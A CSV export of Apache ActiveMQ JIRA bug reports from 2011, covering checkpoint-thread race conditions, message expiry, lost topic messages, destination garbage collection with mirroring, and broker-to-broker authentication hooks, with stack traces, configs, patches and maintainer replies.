"ActiveMQ checkpoint worker makes unnecessary repeated calls to Journal.getFileMap(), leading to excessive memory usage",AMQ-3162,12496743,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,ccondit,ccondit,25/Jan/11 23:05,26/Jan/11 10:42,14/Jul/23 05:43,26/Jan/11 10:42,5.4.2,,,,,5.5.0,,,,,,,0,,,,,,,,,"During its cleanup run (default every 30 seconds), MessageDatabase.checkpointUpdate() attempts to determine which data files are safe to delete. It calls Journal.getFileMap() repeatedly within a loop to determine if the file is referenced in memory. Journal.getFileMap() creates a new TreeMap from the underlying map. Unfortunately, as the number of data files grows on a busy broker, this can be called hundreds or even thousands of times, leading to excessive run time, memory churn, and overall poor performance (observed in our environment).

The attached patch simply moves the call to getFileMap() outside the loop so that it runs in O(gcCandidates.size) vs. O(gcCandidates.size * fileMap.size).",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"25/Jan/11 23:06;ccondit;avoid-getfilemap.patch;https://issues.apache.org/jira/secure/attachment/12469355/avoid-getfilemap.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14708,,,Wed Jan 26 10:42:16 UTC 2011,,,,,,,Patch Available,,,,"0|i0ajxz:",59504,,,,,,,,,,,,,,,,,,,,,"26/Jan/11 10:42;gtully;variant of patch applied in r1063669, with thanks :-)

URL: http://svn.apache.org/viewvc?rev=1063669&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Race condition in ActiveMQ Journal Checkpoint worker thread cleanup leads to multiple running instances,AMQ-3161,12496740,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,gtully,ccondit,ccondit,25/Jan/11 22:55,26/Jan/11 13:32,14/Jul/23 05:43,26/Jan/11 13:32,5.4.2,,,,,5.5.0,,,Message Store,,,,0,,,,,,,,,"If the ActiveMQ Journal Checkpoint worker thread dies for any reason, any updates to KahaDB trigger the thread to be restarted. Unfortunately, there is a race condition between the Thread.isAlive() check and the restart of the thread, potentially leading to multiple instances of the thread being spawned.  We have observed in a busy environment as many as 8-10 instances of this thread, all waking up every 5 seconds to perform database checkpoints, bringing throughput on the broker to a halt.

The attached patch adds a lock around access to creation/destruction of this thread and prevents a second instance from being launched inadvertently.",CentOS 5.2,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3160,,,,,,,,,,,,,"25/Jan/11 22:56;ccondit;checkpoint-thread.patch;https://issues.apache.org/jira/secure/attachment/12469352/checkpoint-thread.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14719,,,Wed Jan 26 13:32:41 UTC 2011,,,,,,,Patch Available,,,,"0|i0ajy7:",59505,,,,,,,,,,,,,,,,,,,,,"25/Jan/11 22:56;ccondit;This patch to MessageDatabase.java prevents accidental launching of multiple Journal checkpoint worker threads.;;;","25/Jan/11 22:57;ccondit;AMQ-3160 is the root cause of the thread aborting, leading to the case where this fix is necessary.;;;","26/Jan/11 13:32;gtully;patch applied with thanks in r1063710

URL: http://svn.apache.org/viewvc?rev=1063710&view=rev

one minor mod, left unsynced check in store, such that locking overhead occurs only if thread needs a restart.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ConcurrentModificationException in ActiveMQ Journal Checkpoint Worker,AMQ-3160,12496738,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,gtully,ccondit,ccondit,25/Jan/11 22:50,26/Jan/11 12:15,14/Jul/23 05:43,26/Jan/11 12:15,5.4.2,,,,,5.5.0,,,Message Store,,,,0,,,,,,,,,"There appears to be a race condition accessing Journal.getHashMap() from the ActiveMQ Journal Checkpoint Worker thread. Under high loads, we occasionally see the following exception in our logs:

Exception in thread ""ActiveMQ Journal Checkpoint Worker"" java.util.ConcurrentModificationException
      at java.util.HashMap$HashIterator.nextEntry(HashMap.java:793)
      at java.util.HashMap$EntryIterator.next(HashMap.java:834)
      at java.util.HashMap$EntryIterator.next(HashMap.java:832)
      at java.util.AbstractMap.putAll(AbstractMap.java:255)
      at java.util.TreeMap.putAll(TreeMap.java:304)
      at java.util.TreeMap.<init>(TreeMap.java:162)
      at org.apache.kahadb.journal.Journal.getFileMap(Journal.java:660)
      at org.apache.activemq.store.kahadb.MessageDatabase.checkpointUpdate(MessageDatabase.java:970)
      at org.apache.activemq.store.kahadb.MessageDatabase.access$400(MessageDatabase.java:82)
      at org.apache.activemq.store.kahadb.MessageDatabase$9.execute(MessageDatabase.java:599)
      at org.apache.kahadb.page.Transaction.execute(Transaction.java:728)
      at org.apache.activemq.store.kahadb.MessageDatabase.checkpointCleanup(MessageDatabase.java:597)
      at org.apache.activemq.store.kahadb.MessageDatabase$3.run(MessageDatabase.java:249)

This leads to the thread aborting prematurely.",CentOS 5.2,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3161,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14711,,,Wed Jan 26 12:15:59 UTC 2011,,,,,,,,,,,"0|i0ajyf:",59506,,,,,,,,,,,,,,,,,,,,,"26/Jan/11 12:15;gtully;sync added in r1063691

URL: http://svn.apache.org/viewvc?rev=1063691&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Garbage collecting inactive destinations does not work with queue mirroring,AMQ-3157,12496720,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,jgomes,jgomes,25/Jan/11 20:26,22/Nov/11 08:30,14/Jul/23 05:43,26/Aug/11 22:25,5.4.2,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"When using the garbage collection feature of inactive queues, the queues are not collected if queue mirroring is turned on.  The following snippet shows a basic configuration for reproducing the problem:

{code:xml}
<broker xmlns=""http://activemq.apache.org/schema/core""
          brokerName=""localhost""
          dataDirectory=""${activemq.base}/data""
          destroyApplicationContextOnStop=""true""
          schedulePeriodForDestinationPurge=""10000"">

        <destinationInterceptors>
            <mirroredQueue copyMessage=""true"" postfix="""" prefix=""Monitor.""/>
        </destinationInterceptors>

        <destinationPolicy>
            <policyMap>
                <policyEntries>
                    <!-- Set auto-cleanup of inactive topics and queues -->
                    <policyEntry queue="">"" producerFlowControl=""true"" memoryLimit=""50mb"" gcInactiveDestinations=""true"" inactiveTimoutBeforeGC=""30000"">
                        <pendingQueuePolicy>
                            <vmQueueCursor/>
                        </pendingQueuePolicy>
                    </policyEntry>
                    <policyEntry topic="">"" producerFlowControl=""true"" memoryLimit=""50mb"" gcInactiveDestinations=""true"" inactiveTimoutBeforeGC=""30000"">
                        <pendingSubscriberPolicy>
                            <vmCursor />
                        </pendingSubscriberPolicy>
                    </policyEntry>
                </policyEntries>
            </policyMap>
        </destinationPolicy>
</broker>
{code}

With this configuration, the topics will be collected, but the queues will not be collected.  In order to get the queues to be collected, the {{<destinationInterceptors>}} section needs to be commented out.","Windows 2003 Server, Java JDK 1.6",darius.schier,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"26/Aug/11 22:15;tabish;AMQ3157Test.java;https://issues.apache.org/jira/secure/attachment/12491842/AMQ3157Test.java","09/Aug/11 20:20;tabish;AMQ3157Test.java;https://issues.apache.org/jira/secure/attachment/12489881/AMQ3157Test.java",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,60092,,,Tue Nov 22 08:30:44 UTC 2011,,,,,,,,,,,"0|i0ajyv:",59508,,,,,,,,,,,,,,,,,,,,,"06/Jul/11 18:46;tabish;Would be great if you could throw together a JUnit test for this.;;;","09/Aug/11 20:20;tabish;Created a little test case to demonstrate the issue.;;;","26/Aug/11 22:15;tabish;Updated test, old version wasn't quite right.;;;","26/Aug/11 22:25;tabish;fix applied in trunk.;;;","22/Nov/11 08:30;darius.schier;Not sure if we have exactly the same problem but it looks pretty familiar.
We gave the snapshot a try, unfortunately we still have very similar problems as described by Jim.
Same as above: GC seems to work fine with destinations that are available after restart but not with dynamically created ones.
Also queues that were created before restart dynamically and still have some load work fine (as the server creates them on startup).

Here is our configuration.

{code:xml}
<destinationInterceptors>
  <mirroredQueue copyMessage = ""true"" postfix="".qmirror"" prefix=""""/>
</destinationInterceptors>
<destinationPolicy>
  <policyMap>
    <policyEntries>
      <policyEntry topic=""testQueue.>"" producerFlowControl=""false"" memoryLimit=""1 mb"" optimizedDispatch=""true""></policyEntry>
      <policyEntry queue=""testQueue.>"" producerFlowControl=""false"" memoryLimit=""1 mb"" optimizedDispatch=""true""></policyEntry>
    </policyEntries>
  </policyMap>
</destinationPolicy>

<persistenceAdapter>
  <kahaDB directory=""${activemq.base}/data/kahadb""/>
</persistenceAdapter>

<systemUsage>
  <systemUsage>
    <memoryUsage>
      <memoryUsage limit=""10 mb""/>
    </memoryUsage>
    <storeUsage>
      <storeUsage limit=""10 gb""/>
    </storeUsage>
    <tempUsage>
      <tempUsage limit=""10 mb""/>
    </tempUsage>
  </systemUsage>
</systemUsage>
{code} 

Would you mind to reopen this issue? 
We use mirrors a lot. From our point of view this could lead to OOM, so we think the priority could/should be increased.

Regards
Darius;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Active MQ lose messages which were published on topic,AMQ-3156,12496681,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,ghoshea,ghoshea,25/Jan/11 14:45,27/Jan/11 14:08,14/Jul/23 05:43,27/Jan/11 14:08,5.2.0,,,,,,,,,,,,0,,,,,,,,,"We use Spring framework with Active MQ. We publish messages to a topic.
We have one consumer. The publisher published message with attributes.
The consumer filters messages by selector on those attributes.
Once in a while a message does not reach the consumer. There are no errors in logs. No disconnection are seen in logs.

Spring configuration on publisher side:

	<bean id=""connectionFactory"" class=""com.icap.dealfeed.common.jms.FailoverableCachingConnectionFactory"">
		<!--  starting with empty impl, later the real impl will be injected -->
		<property name=""targetConnectionFactory"">
			<bean class=""com.icap.dealfeed.common.jms.ConnectionFactoryEmptyImpl"">
			</bean>
		</property>
		<property name=""sessionCacheSize""      value=""5""/>
	</bean>


Spring beans on consumer side:

	<bean id=""rangeUpdateMessageListenerContainer""
                 class=""org.springframework.jms.listener.DefaultMessageListenerContainer"">
		<property name=""connectionFactory""     ref=""connectionFactory"" />
		<!-- Using the CACHE_NONE so Application Resilience will work -->
		<property name=""cacheLevelName""      value=""CACHE_NONE""/>
		<property name=""destinationName""     value=""${jmsRangeUpdateTopicName}""/>
		<property name=""pubSubDomain""        value=""true""/>
		<property name=""messageListener""       ref=""rangeUpdatesMessageListener""/>
		<property name=""exceptionListener""     ref=""rangeUpdatesMessageListener""/>
		<!-- Because its topic there should be no concurrentConsumers, so both following values are 1-->
		<property name=""concurrentConsumers""    value=""1""/>
		<property name=""maxConcurrentConsumers"" value=""1""/>
		<!--  starting on purpose with dummy selector -->
		<property name=""messageSelector""     value=""dummy = 123""/>
		<property name=""autoStartup""         value=""false""/>
	</bean>


	<bean id=""connectionFactory"" class=""org.springframework.jms.connection.CachingConnectionFactory"">

		<property name=""targetConnectionFactory"" ref=""emptyImplConnectionFactory""/>
		<property name=""sessionCacheSize""      value=""5""/>
	</bean>

",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"25/Jan/11 16:24;ghoshea;activemq.log;https://issues.apache.org/jira/secure/attachment/12469294/activemq.log","25/Jan/11 14:48;ghoshea;activemq.xml;https://issues.apache.org/jira/secure/attachment/12469282/activemq.xml",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74724,,,Thu Jan 27 14:08:26 UTC 2011,,,,,,,,,,,"0|i0tsrr:",171970,,,,,,,,,,,,,,,,,,,,,"25/Jan/11 14:48;ghoshea;activemq.xml;;;","25/Jan/11 16:24;ghoshea;This log was created when reproducing the bug in dev environment;;;","25/Jan/11 18:26;gtully;with cache none, a new consumer is created for each receive, leaving no consumer for some duration. When there is no consumer, topic messages are dropped.
Use a durable consumer or CACHE_CONSUMER, with a single consumer with default prefetch, it makes sense to cache it.;;;","27/Jan/11 14:08;ghoshea;There are 2 issues here:
1.
When configuring org.springframework.jms.listener.DefaultMessageListenerContainer with cache none, a new consumer is created for each receive, leaving no consumer for some duration. When there is no consumer, topic messages are dropped.
Using CACHE_CONSUMER solves this issue.

2.
This below exception in activeMQ log:
INFO   | jvm 1    | 2011/01/27 11:35:56 | java.net.SocketException: Software caused connection abort: recv failed
INFO   | jvm 1    | 2011/01/27 11:35:56 | 	at java.net.SocketInputStream.socketRead0(Native Method)
INFO   | jvm 1    | 2011/01/27 11:35:56 | 	at java.net.SocketInputStream.read(SocketInputStream.java:129)
INFO   | jvm 1    | 2011/01/27 11:35:56 | 	at org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill(TcpBufferedInputStream.java:50)
INFO   | jvm 1    | 2011/01/27 11:35:56 | 	at org.apache.activemq.transport.tcp.TcpBufferedInputStream.read(TcpBufferedInputStream.java:58)
INFO   | jvm 1    | 2011/01/27 11:35:56 | 	at java.io.DataInputStream.readInt(DataInputStream.java:370)
INFO   | jvm 1    | 2011/01/27 11:35:56 | 	at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:269)
INFO   | jvm 1    | 2011/01/27 11:35:56 | 	at org.apache.activemq.transport.tcp.TcpTransport.readCommand(TcpTransport.java:210)
INFO   | jvm 1    | 2011/01/27 11:35:56 | 	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:202)
INFO   | jvm 1    | 2011/01/27 11:35:56 | 	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:185)
INFO   | jvm 1    | 2011/01/27 11:35:56 | 	at java.lang.Thread.run(Thread.java:619)

This exception is because we have applicative keep alive that creates connection and session each 2 seconds and than close them.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
unable to implement custom broker-to-broker authorization,AMQ-3154,12496618,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,artnaseef,artnaseef,24/Jan/11 23:41,26/Oct/11 22:42,14/Jul/23 05:43,26/Oct/11 22:42,5.4.2,,,,,5.6.0,,,Broker,,,,1,,,,,,,,,"Ran into the following issues preventing a custom Broker-To-Broker authentication implementation:

  - BrokerFilter's addBroker() can not be used to secure a connection:
      - for duplex connections, it is never called on the initial conneciton
      - even if addBroker() throws an exception, it does not deny access (it does not close the connection nor prevent other functioning)
      - addBroker() does not have direct access to the ConnectionContext, nor any other means for the BrokerFilter to access SSL certificates on the SSL transport

  - BrokerFilter's addConnection() can not be used to secure a connection:
       - there is no way to distinguish broker connections from clients

Other approaches were considered, but lead to dead-ends.

It seems the optimal solution would use the existing addBroker() method.

A patch will be provided that adds a new method specifically for securing Broker-To-Broker connections.",,asussman,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Feb/11 18:37;artnaseef;AMQ3154Test.java;https://issues.apache.org/jira/secure/attachment/12471302/AMQ3154Test.java","24/Jan/11 23:43;artnaseef;pre_add_broker.patch;https://issues.apache.org/jira/secure/attachment/12469217/pre_add_broker.patch","17/Feb/11 20:29;artnaseef;trunk2011-02-17_result.txt;https://issues.apache.org/jira/secure/attachment/12471324/trunk2011-02-17_result.txt",,,,,,,,,,,,,,,,,,,3.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74726,,,Wed Oct 26 22:42:20 UTC 2011,,,,,,,Patch Available,,,,"0|i0agwn:",59012,,,,,,,,,,,,,,,,,,,,,"24/Jan/11 23:43;artnaseef;Patch which adds a ""preAddBroker()"" method to BrokerFilter which is designed specifically to secure broker-to-broker connections.

If an exception is thrown by the method, the TransportConnection shuts down.
;;;","16/Feb/11 18:30;artnaseef;I'm looking for some quick feedback on the fit of this solution; we would like to make use of this update, but prefer to have reason to believe it is a good fit first.  If not, I will gladly implement an alternate approach.;;;","16/Feb/11 19:11;gtully;I would like to see if addBroker could be used/called in a way that can make it work as an authentication point rather than using a new entry point. 
There were some changed to improve failure detection in http://svn.apache.org/viewvc?rev=1069339&view=rev that may be relevant.
If you could produce a junit test case that captures your usage scenario it would be a great help in validating an alternative approach to the current patch.;;;","16/Feb/11 19:33;artnaseef;That would be a nicer solution; I'll take a look at the changes mentioned and work on a JUnit case.;;;","17/Feb/11 01:02;artnaseef;Working on a JUnit, I'm finding it difficult to capture whether the broker connection was made or not.  Subclassing DiscoveryNetworkConnector seemed like a good idea, but even it doesn't appear to have a clear point in its lifecycle at which the success or failure of the connection can be determined.

Any tips would be appreciated.

While it would be possible to create a consumer and producer that use the two different brokers, I'd rather not add that complexity.

Note that I'm working purely with 5.4.2 at this point.;;;","17/Feb/11 09:42;gtully;Go high level with your junit test, having more than one broker is not a problem. Maybe org.apache.activemq.security.JaasNetworkTest can provide some inspiration.

The BrokerInfo command is the only difference between a client and a broker connection.
To see if a broker connection is complete, org.apache.activemq.broker.region.RegionBroker#getPeerBrokerInfos can give you some high level view.
Not sure if this answers your questions but I hope it helps :-);;;","17/Feb/11 17:20;artnaseef;The JaasNetworkTest method should work - I'm just concerned about a short timeout leading to incorrect results.

Trying to clarify - some of this may be a rehash.

Perhaps this description of the problem will help:
   - Need connectors on a broker that can only be used by other, authenticated, brokers
   - Those connectors can not be used by regular clients - only authenticated peer brokers

So, the high level desired flow would be:
&nbsp;&nbsp;ON CONNECTION
&nbsp;&nbsp;&nbsp;&nbsp;IF client IS a broker
&nbsp;&nbsp;&nbsp;&nbsp;THEN
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DO check authentication
&nbsp;&nbsp;&nbsp;&nbsp;ELSE
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DO reject connection
&nbsp;&nbsp;&nbsp;&nbsp;END IF

Securing addConnection() sounds like a good approach, but rejecting a connection does not prevent the creation of network bridges in TransportConnection's processBrokerInfo().  On the other hand, testing shows that exceptions on addBroker() do not prevent the bridges and do not stop the peer from continuing to create a connection.  So, I believe both need to be done.

These obervations are based on the 5.4.2 code; I do see that addBroker()'s handling has changed on the trunk, so that's why it would be good to have a JUnit that can confirm the results of an exception on addBroker() are as-expected.

Checking getPeerBrokerInfos() is one place to check.  Another is to look for network bridges.  I'll try that approach.

Thanks!;;;","17/Feb/11 18:37;artnaseef;JUnit test which shows the attempt to reject peer broker connections using a BrokerFilter which throws exceptions on addBroker().;;;","17/Feb/11 20:29;artnaseef;Full output running against 5.5 trunk snapshot checked out today, 17 Feb 2011; rev: 1071750.

Something is notably different.  The test is getting 4 persistence adapters configured, according to the log output, and one is a KahaDB even though both brokers have been set to be non-persistent.;;;","26/Oct/11 22:42;tabish;The test case passes when run against the current trunk code.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
An expired message that is consumed and resent with an updated expiration never expires again.,AMQ-3153,12496459,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,stirlingc,stirlingc,23/Jan/11 21:03,24/Feb/11 21:02,14/Jul/23 05:43,24/Feb/11 21:02,5.4.2,,,,,5.5.0,,,Broker,,,,0,,,,,,,,,"Symptom
========
We have a use case where a producer sends a message to a queue with an expiration.  When the message expires to the DLQ, a consumer on the DLQ receives the message, modifies it, and resends it to the original queue with an updated expiration.

When the expired message is resent, it is given a new JMS message ID, so is, for all intents and purposes, a new message.  However, althought the resent message has an updated expiration, it never expires to the DLQ.

Cause
=====
When a message expires, an ""originalExpiration"" property is added to the message by RegionBroker.stampAsExpired:

    private boolean stampAsExpired(Message message) throws IOException {
        boolean stamped=false;
        if (message.getProperty(ORIGINAL_EXPIRATION) == null) {
            long expiration=message.getExpiration();     
            message.setProperty(ORIGINAL_EXPIRATION,new Long(expiration));
            stamped = true;
        }
        return stamped;
    }

When the consumer receives and resends the expired message, ActiveMQSession gives the message a new ID and updates its expiration:

    protected void send(ActiveMQMessageProducer producer, ActiveMQDestination destination, Message message, int deliveryMode, int priority, long timeToLive,
                        MemoryUsage producerWindow, int sendTimeout) throws JMSException {
..
            long expiration = 0L;
            if (!producer.getDisableMessageTimestamp()) {
                long timeStamp = System.currentTimeMillis();
                message.setJMSTimestamp(timeStamp);
                if (timeToLive > 0) {
                    expiration = timeToLive + timeStamp;
                }
            }
            message.setJMSExpiration(expiration);
...

            // Set the message id.
            if (msg == message) {
                msg.setMessageId(new MessageId(producer.getProducerInfo().getProducerId(), sequenceNumber));
            } else {
                msg.setMessageId(new MessageId(producer.getProducerInfo().getProducerId(), sequenceNumber));
                message.setJMSMessageID(msg.getMessageId().toString());
            }
...

At this point the resent message has a new ID and a new expiration, so it should be allowed to reexpire.  However, the resent message still carries the originalExpiration property, which makes RegionBroker report the message has not expired (even though it may have):

    @Override
    public boolean isExpired(MessageReference messageReference) {
        boolean expired = false;
        if (messageReference.isExpired()) {
            try {
                // prevent duplicate expiry processing
                Message message = messageReference.getMessage();
                synchronized (message) {
                    expired = stampAsExpired(message);
                }
            } catch (IOException e) {
                LOG.warn(""unexpected exception on message expiry determination for: "" + messageReference, e);
            }
        }
        return expired;
    }

Since the broker is not reporting the message as expired, the expired message processing in Queue bypasses the message (from Queue.doBrowse()):

                                if (broker.isExpired(node)) {
                                    LOG.debug(""expiring from messages: "" + node);
                                    messageExpired(connectionContext, createMessageReference(node.getMessage()));
                                }
                                messages.remove();

Solution
=======
Whenever a message is sent to a broker from a message producer, it should have its originalExpiration property cleared.  I've provided a patch in ActiveMQSession to do this, but I'm not familiar enough with the workflow to know if this is the appropriate place --- I'm specifically unhappy with the need to case the javax.jms.Message to an ActiveMQMessage in order to clear the readonly properties.
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jan/11 21:06;stirlingc;AMQ3513.patch;https://issues.apache.org/jira/secure/attachment/12469103/AMQ3513.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14691,,,Thu Feb 24 21:02:06 UTC 2011,,,,,,,Patch Available,,,,"0|i0agwv:",59013,,,,,,,,,,,,,,,,,,,,,"23/Jan/11 21:06;stirlingc;Patch that clears the originalExpiration property when a message is re-sent and a unit test that fails with AMQ 5.4.2 and passes once the patch is applied.;;;","24/Jan/11 12:15;gtully;patch looks good and it is great to have a testcase :-)

One thought, I wonder if it makes sense to have the originalExpiration property omitted from a message copy. There is by default a copy of a message before sending by a session.
So I am thinking it may be better to remove that property towards the end of:
org.apache.activemq.command.Message#copy

In org.apache.activemq.broker.region.RegionBroker#sendToDeadLetterQueue the message is stamped after a copy and there is no further copy when it is sent to the DQL.

It may be worth a try.
;;;","24/Feb/11 21:01;tabish;Agree with Gary on this one, the Message class copy method is a good place to remove the original expiration property as it really only makes sense when message is on the DLQ.  I've added the supplied unit test along with that fix, tests passing fine now.;;;","24/Feb/11 21:02;tabish;Fix in trunk, test added, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"concurrentStoreAndDispatchQueues when cache disabled can lead to skipped message dispatch, leaving message pending for some time",AMQ-3149,12496260,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,21/Jan/11 11:33,12/Mar/13 17:07,14/Jul/23 05:43,21/Jan/11 17:02,5.4.0,5.4.1,5.4.2,,,5.5.0,,,Broker,,,,0,,,,,,,,,"concurrentStoreAndDispatchQueues is on by default for the kahaDB store. It allows dispatch to happen concurrently with persistence to disk. 

It has a dependency on the cache to do the immediate dispatch.(The idea is that a quick ack can cancel the async message add.) 

On a message send, there is a dispatch attempt, if the cache is disabled and the store has not yet seen the message, the dispatch does nothing. problem! 

The next dispatch attempt will only occur when there is a new message, an ack is received or when the expiry processing (default 30 seconds) kicks in. The result is delayed dispatch or unexpected message expiry.
The cache can be disabled on startup if there are pending messages in the store for the default store based cursor.
Workaround: A simple workaround is to disable concurrentStoreAndDispatchQueues via config {code}<kahaDB .... concurrentStoreAndDispatchQueues=""false"" />{code}

Fix: Async storage should be conditional on the cache being enabled.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3145,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14726,,,Fri Jan 21 17:02:22 UTC 2011,,,,,,,,,,,"0|i0ajz3:",59509,,,,,,,,,,,,,,,,,,,,,"21/Jan/11 11:34;gtully;link to visibility of current state of caching for a q.;;;","21/Jan/11 17:02;gtully;resolved in http://svn.apache.org/viewvc?rev=1061859&view=rev

concurrentStoreAndDispatchQueues is now only in effect when the cache is enabled;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
